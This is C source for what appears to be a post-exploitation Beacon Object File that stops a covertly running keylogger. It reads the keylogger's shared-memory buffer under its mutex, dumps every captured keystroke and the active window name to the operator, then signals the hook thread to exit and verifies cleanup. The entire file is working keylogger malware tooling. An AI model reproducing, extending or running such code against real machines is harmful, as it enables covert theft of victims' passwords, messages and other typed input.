#include <windows.h>

void printoutput(BOOL done);
#include "base.c"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenFileMappingA(DWORD, BOOL, LPCSTR);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$UnmapViewOfFile(LPCVOID);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenEventA(DWORD, BOOL, LPCSTR);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$SetEvent(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenMutexA(DWORD, BOOL, LPCSTR);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReleaseMutex(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);

DECLSPEC_IMPORT BOOL   WINAPI USER32$PostThreadMessageA(DWORD, UINT, WPARAM, LPARAM);

#define KEYLOG_MAGIC      0xDEADBEEF
#define KEYLOG_MAP_NAME   "Local\\keylog_buf"
#define KEYLOG_STOP_NAME  "Local\\keylog_stop"
#define KEYLOG_MUTEX_NAME "Local\\keylog_mutex"

#pragma pack(push, 1)
typedef struct {
    DWORD  magic;
    DWORD  buf_size;
    DWORD  write_pos;
    DWORD  total_keys;
    DWORD  hook_tid;
    CHAR   active_window[256];
} KEYLOG_CTX;
#pragma pack(pop)

void go(char *args, int len)
{
    bofstart();

    HANDLE hMap = KERNEL32$OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, KEYLOG_MAP_NAME);
    if (!hMap) {
        internal_printf("[-] Keylogger is not running (shared memory not found)\n");
        printoutput(TRUE);
        bofstop();
        return;
    }

    KEYLOG_CTX *ctx = (KEYLOG_CTX*)KERNEL32$MapViewOfFile(
        hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    if (!ctx || ctx->magic != KEYLOG_MAGIC) {
        internal_printf("[-] Shared memory invalid or keylogger not initialized\n");
        if (ctx) KERNEL32$UnmapViewOfFile(ctx);
        KERNEL32$CloseHandle(hMap);
        printoutput(TRUE);
        bofstop();
        return;
    }

    DWORD hook_tid   = ctx->hook_tid;
    DWORD total_keys = ctx->total_keys;
    DWORD write_pos  = ctx->write_pos;

    internal_printf("[*] Stopping keylogger (thread: %lu, buffered: %lu keys)...\n",
                    hook_tid, total_keys);

    if (write_pos > 0) {
        HANDLE hMutex = KERNEL32$OpenMutexA(MUTEX_ALL_ACCESS, FALSE, KEYLOG_MUTEX_NAME);
        if (hMutex) {
            KERNEL32$WaitForSingleObject(hMutex, 3000);

            CHAR *buf = (CHAR*)((BYTE*)ctx + sizeof(KEYLOG_CTX));
            DWORD chunk  = 512;
            DWORD offset = 0;
            CHAR  tmp[513];

            internal_printf("[+] Final buffer dump (%lu keystrokes):\n", total_keys);
            internal_printf("----------------------------------------\n");

            while (offset < write_pos) {
                DWORD to_copy = write_pos - offset;
                if (to_copy > chunk) to_copy = chunk;
                MSVCRT$memcpy(tmp, buf + offset, to_copy);
                tmp[to_copy] = '\0';
                internal_printf("%s", tmp);
                offset += to_copy;
            }

            internal_printf("\n----------------------------------------\n");

            KERNEL32$ReleaseMutex(hMutex);
            KERNEL32$CloseHandle(hMutex);
        }
    } else {
        internal_printf("[*] Buffer empty -- nothing to dump\n");
    }

    HANDLE hStopEvent = KERNEL32$OpenEventA(EVENT_MODIFY_STATE, FALSE, KEYLOG_STOP_NAME);
    if (hStopEvent) {
        KERNEL32$SetEvent(hStopEvent);
        KERNEL32$CloseHandle(hStopEvent);
        internal_printf("[+] Stop event signaled\n");
    } else {
        internal_printf("[-] Could not open stop event (err: %lu)\n", KERNEL32$GetLastError());
    }


    if (hook_tid) {
        USER32$PostThreadMessageA(hook_tid, WM_QUIT, 0, 0);
        internal_printf("[+] WM_QUIT posted to thread %lu\n", hook_tid);
    }


    KERNEL32$UnmapViewOfFile(ctx);
    KERNEL32$CloseHandle(hMap);


    internal_printf("[*] Waiting for keylogger thread to exit...\n");
    KERNEL32$Sleep(1500);


    HANDLE hVerify = KERNEL32$OpenFileMappingA(FILE_MAP_READ, FALSE, KEYLOG_MAP_NAME);
    if (!hVerify) {
        internal_printf("[+] Keylogger stopped and shared memory cleaned up\n");
    } else {
        internal_printf("[!] Shared memory still present -- async BOF may still be shutting down\n");
        internal_printf("    Run keylog_stop again in a few seconds if needed\n");
        KERNEL32$CloseHandle(hVerify);
    }

    printoutput(TRUE);
    bofstop();
}